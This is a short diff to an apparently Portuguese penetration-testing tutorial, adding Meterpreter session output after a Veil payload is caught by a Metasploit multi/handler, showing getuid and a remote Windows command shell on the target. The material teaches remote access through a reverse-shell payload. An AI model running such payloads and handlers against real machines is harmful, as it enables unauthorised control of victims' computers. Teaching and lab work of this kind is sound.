@@ -243,4 +243,14 @@ resource (/var/lib/veil/output/handlers/plveil.rc)> exploit -j
 msf6 exploit(multi/handler) > 
 ```
 Quando o playload for executado na máquina alvo, teremos acesso a ela.
+```
+meterpreter > getuid
+Server username: WIN10\user
+meterpreter > shell
+Process 276 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.19045.2965]
+(c) Microsoft Corporation. All rights reserved.
 
+C:\Users\user\Desktop>
+```
